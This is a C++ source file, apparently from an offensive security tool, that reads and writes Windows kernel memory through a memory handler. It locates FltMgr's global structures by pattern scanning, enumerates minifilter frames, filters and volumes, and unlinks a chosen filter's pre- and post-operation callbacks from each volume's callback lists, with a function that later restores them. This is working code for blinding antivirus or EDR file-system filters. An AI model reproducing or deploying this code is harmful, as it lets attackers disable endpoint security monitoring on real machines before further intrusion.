#include "FltUtil.h"
#include <tchar.h>

PVOID FltManager::ResolveDriverBase(const wchar_t* strDriverName)
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(strDriverName, buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

PVOID FltManager::ResolveFltmgrGlobals(LPVOID lpkFltMgrBase)
{
	HMODULE hFltmgr = LoadLibraryExA(R"(C:\WINDOWS\System32\drivers\FLTMGR.SYS)", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hFltmgr) {
		return NULL;
	}

	LPVOID lpFltMgrBase = (PVOID)((SIZE_T)hFltmgr & 0xFFFFFFFFFFFFFF00);

	LPVOID StartSearch = GetProcAddress(hFltmgr, "FltEnumerateFilters");
	LPVOID EndSearch = (LPVOID)((DWORD64)GetProcAddress(hFltmgr, "FltEnumerateFilters") + (DWORD64)0x1000);
	DWORD distance = 0;
	LPVOID pFltGlobals = NULL;

	//FLTMGR!FltEnumerateFilters + 0x81:
	//fffff800`350c90e1 e87a59316e      call    nt!ExInitializeFastOwnerEntry(fffff800`a33dea60)
	//fffff800`350c90e6 4c8b157310fdff  mov     r10, qword ptr[FLTMGR!_imp_KeEnterCriticalRegion(fffff800`3509a160)]
	//fffff800`350c90ed e8fe23326e      call    nt!KeEnterCriticalRegion(fffff800`a33eb4f0)
	//fffff800`350c90f2 41b001          mov     r8b, 1
	//fffff800`350c90f5 488d942480000000 lea     rdx, [rsp + 80h]
	//fffff800`350c90fd 488d0d9476fcff  lea     rcx, [FLTMGR!FltGlobals + 0x58 (fffff800`35090798)]
	//fffff800`350c9104 4c8b154d10fdff  mov     r10, qword ptr[FLTMGR!_imp_ExAcquireFastResourceShared(fffff800`3509a158)]
	//fffff800`350c910b e820da146e      call    nt!ExAcquireFastResourceShared(fffff800`a3216b30)
	
	while (StartSearch <= EndSearch) {
		if ((((PBYTE)StartSearch)[0] == patternFltGlobals[0]) && (((PBYTE)StartSearch)[1] == patternFltGlobals[1]) && (((PBYTE)StartSearch)[2] == patternFltGlobals[2])) {
			distance = *(PDWORD)((DWORD_PTR)StartSearch + 3);
			pFltGlobals = (LPVOID)((DWORD_PTR)StartSearch + distance + 7);
			break;
		}

		StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
	}

	// Calculate offset
	DWORD Offset = (DWORD)pFltGlobals - (DWORD)hFltmgr;

	return (LPVOID) ((DWORD64) lpkFltMgrBase + (DWORD64) Offset - patternFltGlobals[3]);
}

FltManager::FltManager(MemHandler* objMemHandlerArg)
{

	this->objMemHandler = objMemHandlerArg;
	this->lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
	this->lpFltMgrBase = ResolveDriverBase(L"fltmgr.sys");
	this->lpFltGlobals = ResolveFltmgrGlobals(this->lpFltMgrBase);

	bool b = this->objMemHandler->VirtualRead(
		((SIZE_T)this->lpFltGlobals + FLTGLB_OFFSET_FLT_RESOURCE_LISTHEAD + FLT_RESOURCE_LISTHEAD_OFFSET_FRAME_COUNT),
		&this->ulNumFrames,
		sizeof(ULONG)
	);
	if (!b) {
		puts("Could not read frame count");
		return;
	}

	b = this->objMemHandler->VirtualRead(
		((SIZE_T)this->lpFltGlobals + FLTGLB_OFFSET_FLT_RESOURCE_LISTHEAD + FLT_RESOURCE_LISTHEAD_OFFSET_FRAME_LIST),
		&this->lpFltFrameList,
		sizeof(PVOID)
	);
	if (!b) {
		puts("Could not read frame list");
		return;
	}
}

PVOID FltManager::GetFilterByName(const wchar_t* strFilterName)
{
	PVOID lpListHead = NULL;
	PVOID lpFlink = NULL;
	DWORD64 lpFltFrame = NULL;
	ULONG ulFiltersInFrame = 0;

	DWORD64 qwFrameListIter = 0;
	DWORD64 qwFrameListHead = 0;
	DWORD64 lpFilter = 0;

	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)this->lpFltFrameList,
		&lpListHead,
		sizeof(PVOID)
	);
	if (!b) {
		puts("Failed to read frame list head!");
		return NULL;
	}

	printf("List of filters at - %p\n", lpListHead);

	// for each frame
	for (ULONG i = 0; i < this->ulNumFrames; i++) {
		printf("===== FRAME %d =====\n", i);
		// read the flink
		b = this->objMemHandler->VirtualRead(
			(DWORD64)lpListHead,
			&lpFlink,
			sizeof(PVOID)
		);
		if (!b) {
			puts("Failed to read frame list flink!");
			return NULL;
		}
		// now that we've read the FLINK, subtract 0x8 to give us the adjusted _FLTP_FRAME*
		lpFltFrame = (DWORD64)lpFlink - 0x8;
		// now we need to read the number of filters associated with this frame

		printf(
			"Reading count of filters from %llx\n",
			lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_COUNT
		);

		b = this->objMemHandler->VirtualRead(
			lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_COUNT,
			&ulFiltersInFrame,
			sizeof(ULONG)
		);
		if (!b) {
			puts("Failed to read filter count for frame!");
			return NULL;
		}
		printf("Found %d filters for frame\n", ulFiltersInFrame);

		b = this->objMemHandler->VirtualRead(
			lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_FILTER_LISTHEAD,
			&qwFrameListHead,
			sizeof(DWORD64)
		);

		if (!b) {
			puts("Failed to read frame list head!");
			return NULL;
		}


		qwFrameListIter = qwFrameListHead;

		for (ULONG j = 0; j < ulFiltersInFrame; j++) {
			DWORD64 qwFilterName = 0;
			DWORD64 qwFilterNameBuffPtr = 0;
			USHORT Length = 0;

			// adjust by subtracting 0x10 to give us a pointer to our filter
			lpFilter = qwFrameListIter - 0x10;
			qwFilterName = lpFilter + FILTER_OFFSET_NAME;

			// now we read the length of the name
			b = this->objMemHandler->VirtualRead(
				qwFilterName + UNISTR_OFFSET_LEN,
				&Length,
				sizeof(USHORT)
			);

			if (!b) {
				puts("Failed to read size of string for filter name!");
				return NULL;
			}
			// find the pointer to the name buffer
			b = this->objMemHandler->VirtualRead(
				qwFilterName + UNISTR_OFFSET_BUF,
				&qwFilterNameBuffPtr,
				sizeof(DWORD64)
			);
			if (!b) {
				puts("Failed to read buffer pointer for filter name!");
				return NULL;
			}

			// allocate a buffer for the name
			wchar_t* buf = new wchar_t[((SIZE_T)Length) + 2];
			memset(buf, 0, ((SIZE_T)Length) + 2);

			// now read in the actual name
			b = this->objMemHandler->VirtualRead(
				qwFilterNameBuffPtr,
				buf,
				Length
			);
			if (!b) {
				puts("Failed to read buffer pointer for filter name!");
				delete[] buf;
				return NULL;
			}
			printf("\t\nFilter %d - %S", j, buf);
			// compare it to our desired filter

			if (!lstrcmpiW(buf, strFilterName)) {
				printf("\nFound target filter at %llx\n", lpFilter);
				return (PVOID)lpFilter;
			}

			// read in the next flink
			b = this->objMemHandler->VirtualRead(
				qwFrameListIter,
				&qwFrameListIter,
				sizeof(DWORD64)
			);


			if (!b) {
				puts("Failed to read next flink!");
				delete[] buf;
				return NULL;
			}

			// free the buffer 
			delete[] buf;
		}
		// read the list of registered filters in the frame

	}
	printf("\nFailed to find filter matching name %S\n", strFilterName);
	return NULL;
}
PVOID FltManager::GetFrameForFilter(LPVOID lpFilter)
{
	PVOID lpFrame = NULL;

	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFilter + FILTER_OFFSET_FRAME,
		&lpFrame,
		sizeof(PVOID)
	);

	if (!b) {
		puts("Failed to read filter frame!");
		return NULL;
	}

	return lpFrame;
}

std::vector<FLT_OPERATION_REGISTRATION> FltManager::GetOperationsForFilter(PVOID lpFilter)
{
	std::vector<FLT_OPERATION_REGISTRATION> retVec = std::vector<FLT_OPERATION_REGISTRATION>();
	if (!lpFilter) {
		puts("lpFilter is NULL!");
		return retVec;
	}

	DWORD64 qwOperationRegIter = 0;
	DWORD64 qwOperationRegPtr = 0;

	// first we read the pointer to the table of FLT_OPERATION_REGISTRATION
	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFilter + FILTER_OFFSET_OPERATIONS,
		&qwOperationRegPtr,
		sizeof(DWORD64)
	);

	if (!b) {
		puts("Failed to read Operation Registration Ptr!");
		return  std::vector<FLT_OPERATION_REGISTRATION>();
	}


	printf("Operations at %llx\n", qwOperationRegPtr);
	while (TRUE) {
		FLT_OPERATION_REGISTRATION* fltIter = new FLT_OPERATION_REGISTRATION();
		b = this->objMemHandler->VirtualRead(
			qwOperationRegPtr,
			fltIter,
			sizeof(FLT_OPERATION_REGISTRATION)
		);

		if (!b) {
			puts("Failed to read next Operation Registration!");
			return  std::vector<FLT_OPERATION_REGISTRATION>();
		}

		// read until we get IRP_MJ_OPERATION_END
		if (fltIter->MajorFunction == IRP_MJ_OPERATION_END) {
			break;
		}
		retVec.push_back(*fltIter);
		qwOperationRegPtr += sizeof(FLT_OPERATION_REGISTRATION);
	}

	return retVec;
}

std::unordered_map<wchar_t*, PVOID> FltManager::EnumFrameVolumes(LPVOID lpFrame)
{
	ULONG ulNumVolumes = 0;
	DWORD64 qwListIter = 0;

	std::unordered_map<wchar_t*, PVOID> retVal;

	// first we read the count of volumes
	bool b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFrame + FRAME_OFFSET_VOLUME_LIST + VOLUME_LIST_OFFSET_COUNT,
		&ulNumVolumes,
		sizeof(ULONG)
	);
	if (!b) {
		puts("Failed to read volume count!");
		return  std::unordered_map<wchar_t*, PVOID>();
	}

	printf("Found %d attached volumes for frame %p\n", ulNumVolumes, lpFrame);

	// read the list head
	b = this->objMemHandler->VirtualRead(
		(DWORD64)lpFrame + FRAME_OFFSET_VOLUME_LIST + VOLUME_LIST_OFFSET_LIST,
		&qwListIter,
		sizeof(DWORD64)
	);
	if (!b) {
		puts("Failed to read volume list head!");
		return  std::unordered_map<wchar_t*, PVOID>();
	}

	for (ULONG i = 0; i < ulNumVolumes; i++) {
		DWORD64 lpVolume = qwListIter - 0x10;
		DWORD64 lpBuffer = lpVolume + VOLUME_OFFSET_DEVICE_NAME + UNISTR_OFFSET_BUF;
		DWORD64 lpBufferLen = lpVolume + VOLUME_OFFSET_DEVICE_NAME + UNISTR_OFFSET_LEN;
		DWORD64 lpBufferPtr = 0;
		ULONG ulDeviceNameLen = 0;

		// read the string length first
		b = this->objMemHandler->VirtualRead(
			lpBufferLen,
			&ulDeviceNameLen,
			sizeof(USHORT)
		);
		if (!b) {
			puts("Failed to read unicode string length!");
			return  std::unordered_map<wchar_t*, PVOID>();
		}

		// read the pointer to the buffer
		b = this->objMemHandler->VirtualRead(
			lpBuffer,
			&lpBufferPtr,
			sizeof(DWORD64)
		);
		if (!b) {
			puts("Failed to read unicode string buffer ptr!");
			return  std::unordered_map<wchar_t*, PVOID>();
		}

		// then read the actual buffer
		wchar_t* buf = new wchar_t[(SIZE_T)ulDeviceNameLen + 2];
		memset(buf, 0, (SIZE_T)ulDeviceNameLen + 2);

		b = this->objMemHandler->VirtualRead(
			lpBufferPtr,
			buf,
			ulDeviceNameLen
		);
		if (!b) {
			puts("Failed to read unicode string buffer!");
			return  std::unordered_map<wchar_t*, PVOID>();
		}

		retVal[buf] = (PVOID)lpVolume;

		printf("%d\t%S\n", i, buf);

		// go to the next link
		b = this->objMemHandler->VirtualRead(
			(DWORD64)qwListIter,
			&qwListIter,
			sizeof(DWORD64)
		);

		if (!b) {
			puts("Failed to read next volume link!");
			return  std::unordered_map<wchar_t*, PVOID>();
		}
	}
	return retVal;
}

DWORD FltManager::GetFrameCount()
{
	return this->ulNumFrames;
}

BOOL FltManager::UnLinksForVolumesAndCallbacks(
	std::vector<FLT_OPERATION_REGISTRATION> vecTargetOperations,
	std::unordered_map<wchar_t*, PVOID> mapTargetVolumes,
	UCHAR ToRemove
)
{
	ULONG numPatched = 0;
	for (const FLT_OPERATION_REGISTRATION& op : vecTargetOperations) {

		UCHAR index = (UCHAR)op.MajorFunction + 22;

		if (ToRemove != 0 && index != ToRemove) {
			continue;
		}

		for (auto& vol : mapTargetVolumes) {
			if (index > 50) {
				printf("Skipping non-indexed adjusted major fn - %d", index);
				continue;
			}

			DWORD64 lpTargetCallbackListEntryPtr = (DWORD64)vol.second + VOLUME_OFFSET_CALLBACK_TBL + ((DWORD64)index * 0x10);
			printf("\n==== Volume: %S ====\n\tMajFn %d\n\tListEntryPtr - %llx\n", vol.first, index, lpTargetCallbackListEntryPtr);
			DWORD64 lpListHead = 0;
			DWORD64 lpListIter = 0;

			bool b = this->objMemHandler->VirtualRead(
				lpTargetCallbackListEntryPtr,
				&lpListHead,
				sizeof(DWORD64)
			);

			if (!b) return FALSE;

			lpListIter = lpListHead;

			int linknumbers = 0;
			do {
				// read in the preop and post-op
				// operations[0] = PreOp
				// operations[1] = PostOp

				DWORD64 operations[2] = { 0 };
				bool b = this->objMemHandler->VirtualRead(
					lpListIter + CALLBACK_NODE_OFFSET_PREOP,
					operations,
					sizeof(operations)
				);
				if (!b) return FALSE;

				if ((operations[0] == (DWORD64)op.PreOperation && op.PreOperation != NULL) ||
				(operations[1] == (DWORD64)op.PostOperation && op.PostOperation != NULL)){
					printf("\t lpListIter: %llx \n", lpListIter);

					DWORD64 prevNodeAddress = 0x00;
					DWORD64 nextNodeAddress = 0x00;
					bool b = this->objMemHandler->VirtualRead(
						lpListIter + offsetof(LIST_ENTRY, Blink),
						&prevNodeAddress,
						sizeof(DWORD64)
					);

					b = this->objMemHandler->VirtualRead(
						lpListIter + offsetof(LIST_ENTRY, Flink),
						&nextNodeAddress,
						sizeof(DWORD64)
					);

					// Store the old and new values in the map
					DWORD64 BlinkToRestore = 0x00;
					DWORD64 FlinkToRestore = 0x00;
					b = this->objMemHandler->VirtualRead(
						nextNodeAddress + offsetof(LIST_ENTRY, Blink),
						&BlinkToRestore,
						sizeof(DWORD64)
					);

					b = this->objMemHandler->VirtualRead(
						prevNodeAddress + offsetof(LIST_ENTRY, Flink),
						&FlinkToRestore,
						sizeof(DWORD64)
					);


					patchLinksMap[nextNodeAddress + offsetof(LIST_ENTRY, Blink)] = std::make_pair(BlinkToRestore, prevNodeAddress);
					patchLinksMap[prevNodeAddress + offsetof(LIST_ENTRY, Flink)] = std::make_pair(FlinkToRestore, nextNodeAddress);
					//

					b = this->objMemHandler->WriteMemoryDWORD64(
						nextNodeAddress + offsetof(LIST_ENTRY, Blink),
						prevNodeAddress
					);

					b = this->objMemHandler->WriteMemoryDWORD64(
						prevNodeAddress + offsetof(LIST_ENTRY, Flink),
						nextNodeAddress
					);

					puts("\t\t** PATCHED!");
					numPatched++;
				}

				// read the next FLINK
				b = this->objMemHandler->VirtualRead(
					lpListIter,
					&lpListIter,
					sizeof(DWORD64)
				);

				linknumbers++;
				if (!b) return FALSE;
			} while (lpListIter != lpTargetCallbackListEntryPtr);
			printf("linknumbers: %d\n", linknumbers);
		}
	}
	printf("Patched %d links\n", numPatched);
	return TRUE;
}

BOOL FltManager::Restore() {
	BOOL b = false;
	if (patchCallbackMap.size() > 0) {
		for (const auto& entry : patchCallbackMap) {
			DWORD64 address = entry.first;
			DWORD64 oldValue = entry.second.first;  // The old value we want to restore

			printf("Restoring value at address: %llx to old value: %llx\n", address, oldValue);

			// Write the old value back to the original memory location
			b = this->objMemHandler->WriteMemoryDWORD64(address, oldValue);

			if (!b) {
				printf("Failed to restore at address: %llx\n", address);
				return FALSE;
			}
		}
	}
	if (patchLinksMap.size() > 0) {
		for (const auto& entry : patchLinksMap) {
			DWORD64 address = entry.first;
			DWORD64 oldValue = entry.second.first;  // The old value we want to restore

			printf("Restoring value at address: %llx to old value: %llx\n", address, oldValue);

			// Write the old value back to the original memory location
			b = this->objMemHandler->WriteMemoryDWORD64(address, oldValue);

			if (!b) {
				printf("Failed to restore at address: %llx\n", address);
				return FALSE;
			}
		}
	}
	return b;
}

FltManager::~FltManager()
{
}
